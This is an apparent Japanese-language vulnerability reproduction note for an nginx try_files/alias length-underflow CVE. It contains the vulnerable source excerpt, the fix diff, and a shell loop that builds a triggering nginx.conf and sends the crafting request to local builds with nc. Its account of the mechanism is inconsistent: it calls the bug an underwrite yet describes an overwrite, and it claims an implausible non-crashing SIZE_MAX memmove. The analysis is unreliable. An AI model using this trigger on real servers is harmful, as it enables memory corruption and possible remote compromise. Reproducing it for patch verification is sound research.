# CVE-2026-125283 — alias + try_files の script underwrite によるバッファオーバーラン 再現ノート

## 1. 概要

- 対象: nginx 1.31.8（脆弱） / 1.31.9（修正）、比較用に 1.30.6（脆弱） / 1.30.7（修正）
- 不具合: `ngx_http_try_files_handler()` は try_files の名前（変数を含む script）を
  実行する前に計算した予測長 `len` を、script 実行後の `ngx_memmove()` の
  サイズ計算にそのまま使う。alias 使用時、script が予測より短い文字列を
  書いた場合 `len - alias` が size_t でアンダーフローし、巨大サイズの
  `memmove` = バッファオーバーランとなる。
- 誘発条件（本 PoC の構成）: `map` の正規表現評価が `r->captures` を書き換える
  副作用を利用し、「長さ予測パス」と「値パス」で `$1` の評価結果を変えることで、
  予測長（len=2）と実際の書き込み長（6）をずらす。
- 修正コミット（mainline）: `d1ffe6fa89fee120411dd4d37206c1482d869480`
  "Try files: fix uri formating in case of script underwrite"（1.31.9 に収録）
- 修正コミット（stable-1.30）: `b99b6b528b64e93354b5c3453e45701e70c461a8`
  （同一修正、1.30.7 に収録）

### 1.1 ソース上の根拠（1.31.8 修正前）

`src/http/modules/ngx_http_try_files_module.c` の `ngx_http_try_files_handler()`（抜粋）:

```c
    if (ngx_http_script_check_length(&e, 1) != NGX_OK) {
        return NGX_ERROR;
    }

    path.len = e.pos - path.data;

    *e.pos = '\0';

    if (alias && alias != NGX_MAX_SIZE_T_VALUE
        && ngx_strncmp(name, r->uri.data, alias) == 0)
    {
        ngx_memmove(name, name + alias, len - alias);   /* ← len は script 実行前の予測値のまま */
        path.len -= alias;
    }
```

`len` は script 実行前に計算された予測長のまま使われている。script 実行後の
実際の長さは `e.pos - name + 1` で再計算されていないため、script が予測より
短い文字列を書いた場合 `len < alias` となり `len - alias` が size_t で
アンダーフローする。

### 1.2 修正コミット d1ffe6f（mainline / 1.31.9）

```diff
--- a/src/http/modules/ngx_http_try_files_module.c
+++ b/src/http/modules/ngx_http_try_files_module.c
@@ -186,6 +186,7 @@ ngx_http_try_files_handler(ngx_http_request_t *r)
                 return NGX_ERROR;
             }

+            len = e.pos - name + 1;
             path.len = e.pos - path.data;

             *e.pos = '\0';
```

コミットメッセージ（原文）:

> Try files: fix uri formating in case of script underwrite
>
> Previously, if try_files was used with alias, and the script produced
> a string smaller than the predicted size, then an integer underflow
> could happen which resulted in buffer overrun.
>
> Fix is to recalculate the length after running the script.
>
> A similar length recalculation exists in ngx_http_index_module.
> It was added by 25f920eca when fixing script overruns.
>
> Reported by Marc Luchian & Liviu-Alexandru Bud.

修正は 1 行で、script 実行後に `len = e.pos - name + 1` で実際の長さを
再計算する。これにより `len >= 実際の書き込み長` が常に保証され、
`len - alias` のアンダーフローが起きなくなる。なお同一修正が
stable-1.30 ブランチにも `b99b6b52` として入り、release-1.30.7 に収録された
（mainline 側は release-1.31.9 収録）。

## 4. 原理: GET /a/x による len-alias アンダーフロー

リクエストは 1 通り:

```
GET /a/x HTTP/1.1
Host: 127.0.0.1
Connection: close
```

`location /a/ { alias ...; try_files $1$m =404; }` における動作:

1. 長さ予測パス: nginx は script `$1$m` を実行する前に、必要なバッファ長を
   計算する。この時点では `r->ncaptures == 0` のため `$1` の評価は空（長さ 0）。
   続く `$m` の評価で map の正規表現 `~^(/a/.*)` が実行され `r->captures` が
   書き換わる。結果、予測 len = 2（`"M"` + NUL）。
2. 値パス（実際の script 実行）: ここで `$1` は map 正規表現のキャプチャ
   `/a/x`（4 バイト）を返すため、実際の出力は `"/a/xM"`（5 バイト + NUL = 6）。
   `predicted=2, actual=6` で、予測より長い文字列が書かれる。
   （予測時の空評価を保ったまま長さだけが増えた「script overwrite」側の効果と、
   後述の memmove による破壊が同時に起きる構成。）
3. alias 補正の memmove: alias 使用時、script の出力先頭 `alias`（= `len("/a/")`
   = 3）バイトが `r->uri` の先頭と一致すると、nginx は alias 部分を削るために

   ```c
   ngx_memmove(name, name + alias, len - alias);
   ```

   を実行する。ここで `len` は修正前は script 実行前の予測値（2）が使われるため
   `len - alias = 2 - 3 = -1` が size_t（SIZE_MAX）にアンダーフローする。
4. 実行系（glibc の memmove）は巨大サイズを検知できず、実際にはバッファを
   `alias`（3）バイトだけ左へずらす挙動になり、`name` の手前 3 バイト
   （同一 pool 内の隣接メモリ）を破壊する。本構成ではそれが debug ログの
   パス文字列（`/a/` の前にあるはずの `.../html/` の先頭 3 文字）を食う形で現れる。

なお、ローカルビルドの `build/v1.31.8` にはアンダーフロー値を error ログに
出す計装 `POCDBG predicted=%uz actual=%uz alias=%uz n=%iZ` が入っており、
非 ASAN ビルドでも `len - alias` の値を直接確認できる（`modules/125283.py` の
判定にも使用）。

## 5. 再現手順（手動）

```bash
cd /app/data/sessions/conv-43
for v in vuln fixed vuln1306 fixed1307; do
  d=poc-run-F/manual-$v
  mkdir -p $d/conf $d/logs $d/html
  cat > $d/conf/nginx.conf <<EOF
worker_processes 1;
daemon on;
pid $d/logs/nginx.pid;
error_log $d/logs/error.log debug;
events { worker_connections 128; }
http {
    access_log off;
    map \$uri \$m { ~^(/a/.*)  M; }
    server {
        listen 127.0.0.1:18448;
        location /a/ {
            alias $d/html/;
            try_files \$1\$m =404;
        }
    }
}
EOF
  build/inst-$v/sbin/nginx -p $d/ -c $d/conf/nginx.conf
  printf 'GET /a/x HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n' \
    | timeout 5 nc 127.0.0.1 18448 | head -1
  kill $(cat $d/logs/nginx.pid)
  echo "$v: $(grep -o 'trying to use file.*' $d/logs/error.log | head -1)"
done
```

## 9. 注意点

- この CVE は HTTP のみで証明書不要。ポート 18448 を専有使用する。
- ASAN 版は worker が非 root で動くため `logs/` を 777 にしないと ASan レポートが
  `EACCES` で書けないことがある（#16 の実績に基づき、モジュールは ASAN 系バイナリの
  時のみ `logs` を 777 にする）。
- 非 ASAN の vuln/vuln1306 は memmove の巨大サイズが glibc 側で検知されないため
  クラッシュしない。破壊は実メモリ（同一 pool の隣接データ）に起き、本構成では
  debug ログのパス文字列の破損として観測される。実運用では破壊対象がリクエスト
  構造体等になる可能性があり、潜在的な遠隔コード実行リスク（DoS 止まりの可能性も
  あるが保証なし）を含む。
- master が SIGTERM 後に worker を再起動するため、nginx の停止は pid ファイルの
  master へ SIGTERM → 待ち → SIGKILL、加えて `/proc` 走査で自 prefix の nginx のみ
  対象（pkill 不使用）。
- `full-poc.py` は本モジュール作成後に親が統合するため編集していない。
